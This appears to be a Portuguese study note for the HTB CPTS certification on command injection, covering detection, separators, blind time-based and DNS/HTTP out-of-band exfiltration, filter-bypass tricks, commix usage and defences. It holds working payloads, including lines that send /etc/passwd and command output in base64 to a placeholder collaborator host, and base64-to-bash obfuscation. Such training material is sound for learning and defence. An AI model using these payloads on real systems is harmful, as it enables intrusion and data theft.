---
tema: Web / Exploração
tópico: Command Injections — detecção, blind, bypass de filtro e commix
tags: [htb, cpts, rce, command-injection, commix, blind, web]
dificuldade: medium
---

# 💉 CPTS 22 — Command Injections

> [!info] Objetivo
> Fazer o servidor executar **comandos do sistema operacional** que você controla. A causa raiz é sempre a mesma: entrada do usuário concatenada numa string que vai para um shell (`system()`, `os.system`, `child_process.exec`, `Runtime.exec` com shell).
> Dois cenários: **output visível** (fácil) e **blind** (sem eco na resposta) — aí a saída sai por tempo ou por canal alternativo (DNS/HTTP).

---

## 🎯 Quando usar

| Sinal | Por que importa |
|-------|-----------------|
| Parâmetro que parece virar comando: `?cmd=`, `?ping=`, `?host=`, `?convert=` | Não há razão para shell em app web — cheiro forte |
| Ferramenta interna: conversor de imagem, gerador de PDF, "ping host", diagnóstico | Backends costumam chamar binários |
| Upload cujo nome do arquivo vai para um `mv`/`convert` shell | Injeção por **nome de arquivo** |
| Cabeçalhos usados em scripts (`User-Agent`, `X-Forwarded-For`) | Log analisado por shell → injeção |
| App PHP/Node/Python com `exec`, `system`, backticks | Código inseguro é regra, não exceção |

> [!tip] Command vs Code injection
> **Command injection**: sua entrada vai para um **shell** e você usa separadores (`;`, `|`, `&&`) para encadear comandos.
> **Code injection**: sua entrada vai para um **interpretador de linguagem** (PHP `eval`, Python `eval`, deserialização). Não há shell; você escreve código. Confira o contexto antes de testar `;id` — pode não fazer sentido.

---

## 🧰 Ferramentas

| Ferramenta | Uso típico |
|-----------|-----------|
| **Burp Suite** | Fuzz de separadores, throttling, repetidor para blind |
| **commix** | Automação completa: detecção, técnica, shell |
| **Burp Collaborator / interactsh** | Canal OOB para blind (DNS/HTTP) |
| **curl** | Reproduzir payloads de tempo e OOB com precisão |
| **`nc` / `python3 -m http.server` / `tcpdump`** | Servidor e listener para confirmar callback |
| **SecLists** (`command-injection` payloads) | Payloads prontos como ponto de partida |

---

## 🔍 1. Detecção — pontos de injeção

Onde olhar, em ordem de probabilidade:

```text
Parâmetros GET/POST:   cmd, exec, execute, ping, host, ip, query, search, file, filename
Path segments:         /ping/127.0.0.1, /api/convert/<file>
Headers:               User-Agent, Referer, X-Forwarded-For, X-Api-Version
Cookies / JWT claims:  usados em scripts internos
Corpo JSON/XML:        {"host":"127.0.0.1","count":4}
Nome de arquivo:       upload -> processo shell
```

### Probe incremental
```bash
# 1) Valor legítimo: entender a saída normal
curl "http://<IP>/ping?host=127.0.0.1"

# 2) Adicionar comando inofensivo com separador
curl "http://<IP>/ping?host=127.0.0.1;id"

# 3) Se o comando roda, a resposta muda (uid=... aparece)
```

### Classificação de contexto
```text
Resultado: "127.0.0.1;id"          -> entrada NÃO chegou ao shell (só concatenou texto)
Resultado: "id: not found"          -> chegou, mas o contexto era o binário (arg injection)
Resultado: "uid=33(www-data) ..."   -> COMMAND INJECTION confirmado
Resultado: silêncio + erro 500      -> provavelmente execução, mas sem eco (blind)
```

---

## 🧩 2. Separadores de comando

| Operador | Efeito | Quando usar |
|----------|--------|-------------|
| `;` | Executa o próximo **sempre** | Cadeia simples, sem condição |
| `\n` (`%0a`) | Mesmo efeito, quebra de linha | Quando `;` é filtrado |
| `\|` | Pipe: saída do primeiro vira entrada do segundo | Quando precisa da saída |
| `&&` | Executa o segundo **se o primeiro teve sucesso** | Útil quando o primeiro comando já funciona |
| `\|\|` | Executa o segundo **se o primeiro falhou** | Útil quando o primeiro falha naturalmente |
| `` `cmd` `` | Substituição de comando (bash backtick) | Encadeado dentro de outro comando |
| `$(cmd)` | Substituição de comando (recomendado) | Idem, mais legível e aninhável |
| `&` | Roda em background | Saída pode ser perdida; use com redirect |

```bash
# Separadores clássicos sobre um host injection point
; id
| id
&& id
|| id
`id`
$(id)
%0a id
```

```bash
# Uso de pipe para capturar saída de um comando que já funciona
curl "http://<IP>/ping?host=127.0.0.1|id"
```

> [!warning] `%0a` vs `\n` real
> Em URL, use `%0a` (ou `%0d%0a` quando precisa de CRLF). Mandar `\n` literal dentro da query não é a mesma coisa.

---

## 🌐 3. Blind injection — time-based

Sem eco na resposta: prove a execução pelo **tempo**.

```bash
# Linux: atraso artificial
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; ping -c 5 127.0.0.1
; timeout 5 tail -f /dev/null

# Windows: atraso artificial
; timeout /t 5
| ping -n 5 127.0.0.1
```

**Como medir certo**:
```bash
# Duas requisições: baseline e payload, comparando tempo
time curl -s "http://<IP>/ping?host=127.0.0.1" >/dev/null
time curl -s "http://<IP>/ping?host=127.0.0.1;sleep%205" >/dev/null
```

> [!tip] Use `sleep`, não `ping`
> `ping` pode estar bloqueado por firewall/ICMP. `sleep` geralmente existe em ambos os SOs? **Não** — no Windows, use `timeout /t` ou `ping -n`.

---

## 📡 4. Blind injection — OOB (DNS/HTTP)

O jeito confiável de **extrair dados** sem eco: forçar o alvo a fazer uma requisição para você.

```bash
# 1) Confirmar callback simples (DNS/HTTP) no Collaborator/interactsh
; nslookup <COLAB>
; curl http://<COLAB>/
; wget -q -O- http://<COLAB>/
; ping -c 1 <COLAB>
```

```bash
# 2) Exfiltrar um comando em subdomínio (DNS leva a saída)
; nslookup $(whoami).<COLAB>
; nslookup `hostname`.<COLAB>
; curl http://$(whoami).<COLAB>/
```

```bash
# 3) Exfiltrar arquivo em base64, sem espaços/quebras
; curl http://<IP>:<PORT>/?d=$(cat /etc/passwd | base64 -w0)
; nslookup $(cat /etc/hostname | base64 -w0).<COLAB>
```

```bash
# 4) Exfiltrar para arquivo servido pela própria app (quando há webdir gravável)
; id > /var/www/html/out.txt
; cat /etc/passwd > /var/www/html/out.txt
# depois: curl http://<IP>/out.txt
```

> [!warning] Limite de DNS
> Saída longa em base64 pode estourar o tamanho do label/subdomínio. Quebre em pedaços (`head -c 40`, `tail -c 40`) ou use HTTP em vez de DNS.

---

## 🛡️ 5. Bypass de filtro

### 5.1 Espaço filtrado

```bash
# Linux — variável IFS (Internal Field Separator), que vale " " por padrão
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd          # $9 é um argumento vazio; separa token de "/"

# Expansão de chaves
{cat,/etc/passwd}

# Redirecionamento (sem espaço nenhum)
cat</etc/passwd

# Windows — aspas separam sem espaço quando o comando é montado por concatenação
"cat""/etc/passwd"            # raramente útil em shell real
```

### 5.2 Blacklist de comandos e de caracteres

```bash
# Concatenação com quotes (quebra a assinatura "cat")
c'a't /etc/passwd
c"a"t /etc/passwd
wh''oami

# Escape com backslash
c\at /etc/passwd

# Variável de ambiente para montar o nome
a=ca;b=t;$a$b /etc/passwd
```

### 5.3 Barrar `/` ou palavras-chave com expansão

```bash
# Tirar "/" de ${PATH} (primeiro caractere costuma ser "/")
${PATH:0:1}etc${PATH:0:1}passwd

# Bash: usar variáveis em vez de literais
echo${IFS}L2Jpbg==|base64${IFS}-d|bash     # base64 de "L2Jpbg==" -> "/bin"
```

### 5.4 Codificação

```bash
# Base64 -> bash
echo aWQK | base64 -d | bash
bash -c "$(echo aWQ= | base64 -d)"

# Hex escape (bash ansi-c)
$'\x69\x64'                   # -> id
$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'   # -> /etc/passwd

# Octal / printf
$(printf '\151\144')          # -> id
```

### 5.5 Wildcards (quando o nome do comando é filtrado)

```bash
/???/??t /etc/passwd          # -> /bin/cat /etc/passwd
/???/????? /etc/passwd        # -> /bin/..... (o que casar)
```

### 5.6 Quebra de linha e comentários

```bash
# %0a substitui ';' quando este é filtrado
127.0.0.1%0aid

# Sublinhado em variáveis de ambiente bash: `${...}` aceita quebra
# Bloquear '#' pode ser driblado com ':'
```

### 5.7 Windows específico

```cmd
:: separadores
& whoami
| whoami
&& whoami

:: variável de ambiente como separador
whoami
%COMSPEC% /c whoami

:: caret para partir tokens
who^ami
```

> [!tip] Encontre o filtro com fuzzing
> Envie um payload por caractere (`;`, `` ` ``, `$`, `(`, `|`, `&`, `%0a`) e compare respostas (tamanho, status, tempo). O caractere que muda o comportamento é a pista do filtro.

---

## 🤖 6. commix

```bash
# Detecção básica em parâmetro GET
commix --url="http://<IP>/ping?host=127.0.0.1" --batch

# A partir de arquivo de request (recomendado: preserva cookies, headers, método)
commix -r request.txt --batch

# Forçar técnica (t=time, f=file, c=classic)
commix --url="http://<IP>/?cmd=test" --technique=t --batch

# Executar comando pontual e sair
commix --url="http://<IP>/?cmd=test" --os-cmd="id" --batch

# Pseudo-terminal interativo após detecção
commix --url="http://<IP>/?cmd=test" --os-shell --batch

# Especificar parâmetro de injeção e dados POST
commix --url="http://<IP>/run.php" --data="ip=127.0.0.1" -p ip --batch

# Ajuste de agressividade/tempo
commix -r request.txt --level=3 --delay=1 --batch
```

```bash
# Gerar request.txt a partir da UI: salve a request "raw" do Burp
# (linha 1 = método + path, depois headers e corpo) e passe com -r
```

> [!warning] commix "achou" ≠ achou
> Sempre **valide manualmente** o payload que ele reportou. Falso positivo em filtro mal calibrado acontece.

---

## 🧫 7. Funções perigosas por linguagem

| Linguagem | Funções / padrões | Observação |
|-----------|-------------------|-----------|
| PHP | `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`, `` `...` `` | `escapeshellcmd` só escapa caracteres — `escapeshellarg` é o correto |
| PHP (código) | `eval`, `assert`, `create_function`, `preg_replace` com `/e` (legado) | Code injection, não command |
| Python | `os.system`, `os.popen`, `subprocess` com `shell=True` | Sem `shell=True` a lista é tratada como argv (mais seguro) |
| Node.js | `child_process.exec`, `execSync` | `execFile`/`spawn` sem shell reduzem risco |
| Java | `Runtime.exec` (com shell), `ProcessBuilder` | Rejeitar shell e usar argumentos separados |
| Ruby | backticks, `system`, `%x{}`, `IO.popen` | `system("cmd", arg)` sem array passa pelo shell |

```php
# Exemplo de código vulnerável (o padrão que causa a falha)
$ip = $_GET['host'];
system("ping -c 1 " . $ip);     // entrada crua concatenada no shell
```

---

## 🛡️ 8. Defesas (lado azul)

| Controle | Efeito |
|----------|--------|
| Evitar shell: usar API que aceita **array de argumentos** | Sem shell, não há separador |
| Whitelist estrita de valores (IPs, formatos, enum) | Mata o vetor na origem |
| `escapeshellarg()` em cada argumento (PHP) | Neutraliza metacharacters |
| Nunca chamar shell com entrada do usuário | Reduz superfície a zero |
| Rodar processos com usuário de baixo privilégio | Limita dano |
| Container read-only + sem rede de saída | Cancela exfiltração OOB |
| Log e alerta de comandos anômalos | Detecção |

---

## ⚠️ Pegadinhas

- **Contexto errado**: usar `;` num ponto em que a entrada é só concatenada a texto = falso negativo. Identifique se há shell de fato.
- **Argument injection ≠ command injection**: `--help`, `-o` podem alterar comportamento de um binário sem shell. Vale a pena testar mesmo sem separador.
- **Saída suprimida**: app pode executar e não mostrar nada. Teste **tempo** e **OOB** antes de descartar.
- **Dependência de shell**: `$()` e crases são bash/`sh`; em `exec` sem shell, não funcionam. Ajuste o payload à linguagem.
- **Windows vs Linux**: `sleep` não existe no Windows; use `timeout /t` ou `ping -n`. Diretórios e separadores também mudam.
- **`base64 -w0`** é GNU coreutils; no macOS/sem GNU, use `-w 0` ou `tr -d '\n'`.
- **OOB bloqueado**: egress pode estar filtrado. Teste DNS primeiro (mais frequentemente liberado que HTTP).
- **Comando com saída de erro**: `2>&1` é seu amigo; sem ele, muitos comandos falham silenciosamente.
- **Filtro que normaliza**: remover/escapar `/` ou `.` pode quebrar o payload. Valide o comando localmente antes.

---

## ✅ Checklist rápido

```text
[ ] Mapear todos os pontos que parecem virar comando no servidor
[ ] Confirmar contexto: shell real? argumento? código?
[ ] Testar separadores: ; | && || ` $() %0a
[ ] Testar argument injection (-h, --help, -o)
[ ] Se não houver eco: time-based (sleep 5 / timeout /t 5)
[ ] Se não houver eco: OOB DNS/HTTP (nslookup/curl para <COLAB>)
[ ] Exfiltrar dados: subdomínio, base64, arquivo em webdir
[ ] Identificar o filtro (fuzz caractere a caractere)
[ ] Bypass: ${IFS}, quotes, $@, base64, hex, wildcards, newline
[ ] commix para automatizar e confirmar manualmente
[ ] Escalar para reverse shell
[ ] Registrar payload exato + SO do alvo
```

---

## 🔗 Relacionado

- [[CPTS 21 - File Upload Attacks]]
- [[CPTS 08 - Shells and Payloads]]
- [[CPTS 14 - Using Web Proxies]]
- [[CPTS 23 - Web Attacks]]
- [[Fase 06 - Vulnerabilidade e Exploração]]
